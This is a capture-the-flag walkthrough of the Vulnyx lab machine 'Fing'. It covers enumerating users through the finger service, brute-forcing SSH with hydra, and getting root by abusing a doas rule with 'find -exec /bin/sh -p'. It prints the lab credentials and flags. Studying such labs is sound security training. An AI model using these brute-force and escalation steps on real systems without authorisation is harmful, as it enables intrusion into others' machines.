# Vulnyx: Fing

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `msfconsole` · `hydra` |
| **Tags** | `#Finger` `#UsernameEnumeration` `#BruteForce` `#doas` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

The `finger` service — an old protocol for querying user info on a remote system — leaks a valid username. That's enough to run a focused SSH brute force instead of a blind one, landing credentials for `adam`. From there, a `doas` rule (a lighter alternative to `sudo`) allows running `find` as root, and `find`'s own `-exec` flag is enough to spawn a root shell.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn fing.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
79/tcp open  finger  syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:CA:12:A8 (VMware)
```

Three ports are found open: **22 (SSH)**, **79 (finger)**, and **80 (HTTP)**. `finger` in particular is worth noting — it's a legacy service, rarely seen exposed today, historically used to query information about users on a remote system. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,79,80 -sCV fing.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 00:0C:29:CA:12:A8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://fing.nyx
```
<img src="../Images/fing/Pasted image 20260518175754.png"/>

```bash
$ gobuster dir -u 'http://fing.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html            (Status: 200) [Size: 10701]
server-status          (Status: 403) [Size: 278]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

### Enumerating Users via `finger`

Rather than the web app, `finger` itself is the more interesting service — it can be queried to check whether a given name corresponds to a real account. Metasploit's dedicated scanner automates trying a whole list of candidate names:

```bash
$ msfconsole -q
msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/seclists/Usernames/Names/names.txt
USERS_FILE ⇒ /usr/share/seclists/Usernames/Names/names.txt
msf auxiliary(scanner/finger/finger_users) > run

[+] fing.nyx:79      - fing.nyx:79 - Found user: adam
```

> **Dictionary:** `/usr/share/seclists/Usernames/Names/names.txt`

The scan confirms `adam` as a valid username.

## Initial Access

### Shell as adam

With a real username in hand, a focused SSH brute force is far more efficient than guessing both username and password at once:

```bash
$ hydra -l 'adam' -P /usr/share/wordlists/rockyou.txt ssh://fing.nyx

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 17:43:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://fing.nyx:22/
[22][ssh] host: fing.nyx   login: adam   password: passion
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `adam:passion`

```bash
$ ssh adam@fing.nyx
adam@fing.nyx's password:
Linux fing 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
Last login: Sun Apr 23 13:21:44 2023 from 192.168.1.10
adam@fing:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
adam@fing:~$ ls -l /home/adam
total 4
-r-------- 1 adam adam 33 Apr 23  2023 user.txt
adam@fing:~$ cat /home/adam/user.txt
ff18a9aca2d1dac41a5c26e6667bea9d
```

> **User flag:** `ff18a9aca2d1dac41a5c26e6667bea9d`

## Privilege Escalation

### Abusing `find` via `doas`

```bash
adam@fing:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 Feb  7 2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 39008 Feb  5 2021 /usr/bin/doas
-rwsr-xr-x 1 root root 88304 Feb  7 2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52880 Feb  7 2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 63960 Feb  7 2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 Feb  7 2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 481608 Jul  2 2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Oct  5 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Nothing obvious turns up among SUID binaries, so `doas` — a smaller, OpenBSD-originated alternative to `sudo`, also available on Linux — is checked next:

```bash
adam@fing:~$ ls -l /etc/doas.conf
-rw-r--r-- 1 root root 53 Apr 23  2023 /etc/doas.conf
adam@fing:~$ cat /etc/doas.conf
permit nopass keepenv adam as root cmd /usr/bin/find
```

`find`'s own `-exec` flag is a well-documented privilege escalation vector whenever it can be run as another user: since the spawned process inherits the privileges `find` itself is running with, `-exec /bin/sh -p` drops straight into a shell as that user instead of just running a single command:

```bash
adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -l /root
total 4
-r-------- 1 root root 33 Apr 23  2023 root.txt
# cat /root/root.txt
1edf2dfe68c6745e93affa42be9a80ce
```

> **Root flag:** `1edf2dfe68c6745e93affa42be9a80ce`

## Takeaways

- Legacy services like `finger` are easy to overlook, but they can leak exactly the kind of information (valid usernames) that turns a blind brute force into a targeted one.
- `doas` carries the same class of risk as `sudo` — a rule that allows running a powerful binary as another user is only as safe as that binary's own feature set, GTFOBins-documented escape hatches included.
- `find -exec` is one of the most common privilege escalation primitives across both `sudo` and `doas` misconfigurations, precisely because `find` is common enough to show up in permission lists without raising suspicion.